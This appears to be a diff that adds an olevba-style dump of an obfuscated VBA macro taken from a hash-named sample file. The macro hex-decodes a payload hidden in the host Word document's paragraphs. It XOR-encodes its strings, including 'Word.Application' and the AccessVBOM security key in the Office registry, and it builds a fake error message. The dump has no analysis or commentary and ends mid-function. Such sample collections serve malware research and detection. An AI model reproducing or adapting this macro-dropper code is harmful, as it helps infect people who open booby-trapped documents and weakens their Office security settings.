@@ -1,0 +1,327 @@
+Filename     : ./macros/6b28a0252d0812221e1dcfaf06017ed96595bae2c59dd7ba03a41093faeca1d1
+OLE stream   : Macros/VBA/Module1
+VBA filename : Module1.bas
+----------------------------------------
+Attribute VB_Name = "Module1"
+Private Function AK3s8l85vAYpbKRoaS93b7AKDbwL7WyaEbOeZJOS(ByVal strAscii As String) As Byte
+
+    Dim gksxy6jqNrdoFPTXg0ww0LOHL9XE_1qwdpBNMVpF As Byte
+    Dim BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw As Byte
+    Dim qm4YRjorMQakCDUSDiPVbEQL1VAYZcqMAp5MFNyo As String * 1
+
+    gksxy6jqNrdoFPTXg0ww0LOHL9XE_1qwdpBNMVpF = 0
+    If (Len(strAscii) = 1) Then
+        qm4YRjorMQakCDUSDiPVbEQL1VAYZcqMAp5MFNyo = Mid(strAscii, 1, 1)
+        BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw = Asc(qm4YRjorMQakCDUSDiPVbEQL1VAYZcqMAp5MFNyo)
+        If (BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw >= 65 And BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw <= 70) Then
+            BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw = BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw - 65 + 10
+        Else
+            BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw = BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw - 48
+        End If
+        gksxy6jqNrdoFPTXg0ww0LOHL9XE_1qwdpBNMVpF = BoGyIpozT767ZXKYajVv8JLoIOdKJ86cy1ZxypKw
+    End If
+    AK3s8l85vAYpbKRoaS93b7AKDbwL7WyaEbOeZJOS = gksxy6jqNrdoFPTXg0ww0LOHL9XE_1qwdpBNMVpF
+
+End Function
+
+Private Function Wta_pH97N1gBZcYt9jPYQoZz3NM_XCpr3i7IXAlW(cb As Integer) As String
+
+    Randomize
+    Dim pNZUZMBV87VeAQkMykXWJrtzpoLcx7cRLqvpFWNf As String
+    pNZUZMBV87VeAQkMykXWJrtzpoLcx7cRLqvpFWNf = "abcdefghijklmnopqrstuvwxyz"
+    pNZUZMBV87VeAQkMykXWJrtzpoLcx7cRLqvpFWNf = pNZUZMBV87VeAQkMykXWJrtzpoLcx7cRLqvpFWNf & UCase(pNZUZMBV87VeAQkMykXWJrtzpoLcx7cRLqvpFWNf) & "0123456789"
+
+    For i = 1 To cb
+        RandomString = RandomString & Mid$(pNZUZMBV87VeAQkMykXWJrtzpoLcx7cRLqvpFWNf, Int(Rnd() * Len(pNZUZMBV87VeAQkMykXWJrtzpoLcx7cRLqvpFWNf) + 1), 1)
+    Next
+
+    Wta_pH97N1gBZcYt9jPYQoZz3NM_XCpr3i7IXAlW = RandomString
+
+End Function
+
+Private Function BkMDyKydgAclEJ_TdOvQpvnZOwI1VB8DIP1CnxDS() As String
+    Dim kGPSiccK4jfkRCGZjqvA1on0V4t9lW7BxHB3CChc As Document
+    Dim c17fTT_9Lw5frceXjPYdJ2o9bEN90DmI8io0g871 As String
+    Dim urGlTx24Oenh4TWdbgEsL0yfZz6JV5w2GKLFaNgC As String * 1
+    Dim l2mBRo6O0WdoWSxuUrnksj9IJkCl8g3o026JFXpB As String * 1
+    Dim siJ_T87ObgMKqXa1TETwMMGKTPoULQQY2MS9BaQB As Byte
+    Dim dPaTvjZ4S5R03TPHD_74Ke3mqOIE41rJOijYBNfz As Byte
+    Dim Rj1GZPU9YawB2LR_MOtIBk_RE8dMAR5QKxercnnB As Long
+    Dim UzGUvQG2sjcOkxYwka1RC7z74HRvypNorSO2E5mP As Long
+    Dim sakhEivcAI62mwZM_zQPZbw2wPmtKWTePcpsOitN As String
+    Dim bFVQjL1WT235gxQhFiLQX2sFQSd97yZH52DkgGJL As String
+    Dim NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 As String
+
+    c17fTT_9Lw5frceXjPYdJ2o9bEN90DmI8io0g871 = ActiveDocument.Paragraphs(ActiveDocument.Paragraphs.Count - 5).Range.Text
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = ""
+    For i = 1 To Len(c17fTT_9Lw5frceXjPYdJ2o9bEN90DmI8io0g871) - 1 Step 2
+        urGlTx24Oenh4TWdbgEsL0yfZz6JV5w2GKLFaNgC = Mid(c17fTT_9Lw5frceXjPYdJ2o9bEN90DmI8io0g871, i, 1)
+        l2mBRo6O0WdoWSxuUrnksj9IJkCl8g3o026JFXpB = Mid(c17fTT_9Lw5frceXjPYdJ2o9bEN90DmI8io0g871, i + 1, 1)
+        siJ_T87ObgMKqXa1TETwMMGKTPoULQQY2MS9BaQB = AK3s8l85vAYpbKRoaS93b7AKDbwL7WyaEbOeZJOS(urGlTx24Oenh4TWdbgEsL0yfZz6JV5w2GKLFaNgC)
+        dPaTvjZ4S5R03TPHD_74Ke3mqOIE41rJOijYBNfz = AK3s8l85vAYpbKRoaS93b7AKDbwL7WyaEbOeZJOS(l2mBRo6O0WdoWSxuUrnksj9IJkCl8g3o026JFXpB)
+        Value = siJ_T87ObgMKqXa1TETwMMGKTPoULQQY2MS9BaQB * 16 + dPaTvjZ4S5R03TPHD_74Ke3mqOIE41rJOijYBNfz
+        NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(Value)
+    Next i
+    
+    BkMDyKydgAclEJ_TdOvQpvnZOwI1VB8DIP1CnxDS = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1
+
+End Function
+
+Private Function jjrv3bWfU2eCn4J6XOP12wiFrzEPIowGaDy53SVD(QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl, regKey)
+    On Error Resume Next
+    QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl.RegRead regKey
+    jjrv3bWfU2eCn4J6XOP12wiFrzEPIowGaDy53SVD = (Err.Number = 0)
+End Function
+
+Private Function At7TnwgE6WFAJCPN0N3ux7yvyxsKyD25TcrAoqiW() As String
+    Dim NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 As String
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = ""
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 97)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(47 Xor 100)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 94)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(43 Xor 114)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(39 Xor 120)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 92)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(59 Xor 110)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(57 Xor 107)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(57 Xor 107)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 94)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 103)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(57 Xor 109)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(39 Xor 120)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(59 Xor 110)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(63 Xor 108)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 94)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(57 Xor 107)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 117)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(63 Xor 108)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(231 Xor 136)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(25 Xor 127)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 141)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(231 Xor 144)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 122)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 139)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 126)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 117)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(43 Xor 102)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(235 Xor 130)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 124)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 139)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(231 Xor 136)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(255 Xor 140)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(231 Xor 136)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(25 Xor 127)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 141)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 117)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(39 Xor 104)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(25 Xor 127)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(25 Xor 127)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(235 Xor 130)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 124)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 126)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 117)
+    Dim UXN_Lt8rcu71HidWDeFuOLmR6PWzCkHsrZxB4PBA As String
+    UXN_Lt8rcu71HidWDeFuOLmR6PWzCkHsrZxB4PBA = j_JNJWXzPK4hOr5tWCmP4w6tTzIyaepBv8bxoLNC
+    Set ex0qo_ihM7Td6jd8BXTXyAQTOGAILDRPE4gfKWt7 = GetObject(, UXN_Lt8rcu71HidWDeFuOLmR6PWzCkHsrZxB4PBA)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & ex0qo_ihM7Td6jd8BXTXyAQTOGAILDRPE4gfKWt7.Version
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 117)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(39 Xor 112)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(231 Xor 136)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 139)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(25 Xor 125)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 117)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(63 Xor 108)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 126)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 124)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(251 Xor 142)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 139)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(235 Xor 130)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 141)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(235 Xor 146)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(41 Xor 117)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 90)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 124)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 124)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 126)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(255 Xor 140)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(255 Xor 140)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(57 Xor 111)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(25 Xor 91)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(39 Xor 104)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(43 Xor 102)
+    At7TnwgE6WFAJCPN0N3ux7yvyxsKyD25TcrAoqiW = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1
+End Function
+
+Private Function j_JNJWXzPK4hOr5tWCmP4w6tTzIyaepBv8bxoLNC() As String
+    Dim NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 As String
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = ""
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(39 Xor 112)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(231 Xor 136)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 139)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(25 Xor 125)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(105 Xor 71)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 90)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 137)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 137)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(233 Xor 133)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(235 Xor 130)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 124)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 122)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 141)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(235 Xor 130)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(231 Xor 136)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(233 Xor 135)
+    j_JNJWXzPK4hOr5tWCmP4w6tTzIyaepBv8bxoLNC = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1
+End Function
+
+Private Function CTWOzLis6ZFM3tSNUfU9dppAkuNGgx4aQLcbBiV7() As String
+    Dim NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 As String
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = ""
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(39 Xor 112)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(255 Xor 140)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(31 Xor 124)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 139)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(235 Xor 130)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 137)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(249 Xor 141)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(105 Xor 71)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(63 Xor 108)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(233 Xor 129)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(27 Xor 126)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(233 Xor 133)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(233 Xor 133)
+    CTWOzLis6ZFM3tSNUfU9dppAkuNGgx4aQLcbBiV7 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1
+End Function
+
+Private Function hgqbADy1goE9RDodtlt4ZCczUuWjgGcCkMTYZd0H() As String
+    Dim NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 As String
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = ""
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(105 Xor 44)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(32 Xor 82)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(108 Xor 30)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(111 Xor 0)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(118 Xor 4)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(101 Xor 69)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(32 Xor 67)
